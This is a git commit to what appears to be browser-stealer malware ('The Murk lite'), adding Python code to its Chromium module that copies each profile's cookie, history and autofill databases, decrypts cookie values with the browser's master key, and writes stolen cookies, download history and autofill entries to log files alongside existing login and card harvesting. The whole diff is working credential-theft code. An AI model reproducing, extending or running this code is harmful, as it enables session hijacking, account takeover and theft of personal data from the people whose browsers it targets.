5ee6611a231171ae987036da738d31b4e38cf553
Nick Vinesmoke <darkdedpro@gmail.com>
2023-12-10 21:10:11 +0200

    cookies and autofils

--- The Murk lite/targets/browsers/chromium.py
+++ The Murk lite/targets/browsers/chromium.py
@@ -4,7 +4,7 @@ import base64
 import json
 from win32crypt import CryptUnprotectData
 #from manager.logger import Log
-from shutil import copy2,copy
+from shutil import copy2
 from sqlite3 import connect
 from Crypto.Cipher import AES
 from datetime import datetime, timedelta
@@ -118,7 +118,6 @@ def get_web_history(path):
             pass
     except Exception as e:
         #Log(f"{path} history ---> {e}")
-        print(e)
         pass
 
 def Write(pathToLogs, browser):
@@ -146,13 +145,115 @@ def Write(pathToLogs, browser):
                 f.write(history)
         f.close()
     
-
+    if(downhistory):
+        with open(rf"{pathToLogs}\\{browser}\\downhistory.txt", "w", encoding="utf-8") as f:
+                f.write(downhistory)
+        f.close()
+    
+    if(cookies):
+        with open(rf"{pathToLogs}\\{browser}\\cookies.txt", "w", encoding="utf-8") as f:
+                f.write(cookies)
+        f.close()
+    
+    if(autofills):
+        with open(rf"{pathToLogs}\\{browser}\\autofills.txt", "w", encoding="utf-8") as f:
+                f.write(autofills)
+        f.close()
+    
         logins = ''''''
         cookies = ''''''
         history = ''''''
         downhistory = ''''''
         cards = ''''''
         autofills = ''''''
+
+def get_downloads(path):
+    try:
+        global downhistory
+        num = path.rfind("\\")
+        profile = path[num+1:]
+        downhistory += f"===============================\n\n\n{profile}:\n\n"
+        downloads_db = f'{path}\\History'
+        if not os.path.exists(downloads_db):
+            return
+        copy2(downloads_db, os.path.dirname(path)+'\\downloads_db')
+        conn = connect(os.path.dirname(path)+'\\downloads_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT tab_url, target_path FROM downloads')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1]:
+                continue
+            downhistory += f"""
+Download URL: {row[0]}
+Local Path: {row[1]}
+"""
+        conn.close()
+        try:
+            os.remove(os.path.dirname(path)+'\\downloads_db')
+        except:
+            pass
+    except Exception as e:
+        #Log(f"{path} downhistory ---> {e}")
+        pass
+
+def get_cookies(path, master_key):
+    try:
+        global cookies
+        num = path.rfind("\\")
+        profile = path[num+1:]
+        cookies += f"===============================\n\n\n{profile}:\n\n"
+        cookie_db = path + '\\Network\\Cookies'
+        if not os.path.exists(cookie_db):
+            return None
+        copy2(cookie_db, os.path.dirname(path)+'\\cookie_db')
+        conn = connect(os.path.dirname(path)+'\\cookie_db')
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, path, datetime(expires_utc/1000000,'unixepoch') as expires_utc, name, encrypted_value FROM cookies")
+        for row in cursor.fetchall():
+            if not all(row[:4]):
+                continue
+
+            cookie_value = decrypt_password(row[4], master_key)
+            cookie_line = f"{row[0]}\tTRUE\t{row[2]}\tFALSE\t{row[4]}\t{row[1]}\t{cookie_value}"
+            cookies += cookie_line + "\n\n"
+        conn.close()
+        try:
+            os.remove(os.path.dirname(path)+'\\cookie_db')
+        except:
+            pass
+    except Exception as e:
+        #Log(f"{path} cookies ---> {e}")
+        pass
+
+def get_autofils(path):
+    try:
+        global autofills
+        num = path.rfind("\\")
+        profile = path[num+1:]
+        autofills += f"===============================\n\n\n{profile}:\n\n"
+        webdata = f'{path}\\Web Data'
+        if not os.path.exists(webdata):
+            return
+        copy2(webdata, os.path.dirname(path)+'\\Web Data')
+        conn = connect(os.path.dirname(path)+'\\Web Data')
+        cursor = conn.cursor()
+        cursor.execute('SELECT name, value FROM autofill')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1]:
+                continue
+            autofills += f"""
+Name: {row[0]}
+Value: {row[1]}
+"""
+        conn.close()
+        try:
+            os.remove(os.path.dirname(path)+'\\Web Data')
+        except:
+            pass
+    except Exception as e:
+        #Log(f"{path} autofils ---> {e}")
+        pass
+
 
 def Chromium():
     global logins
@@ -203,9 +304,9 @@ def Chromium():
                 try:
                     get_login_data(profile_path, master_key)
                     get_web_history(profile_path)
-                    #downhistory = get_downloads(profile_path)
-                    #cookies = get_cookies(profile_path, master_key)
-                    #autofills = get_autofils(profile_path)
+                    get_downloads(profile_path)
+                    get_cookies(profile_path, master_key)
+                    get_autofils(profile_path)
                 except Exception as error:
                     #Log(f"{profile_path} ---> {error}")
                     pass
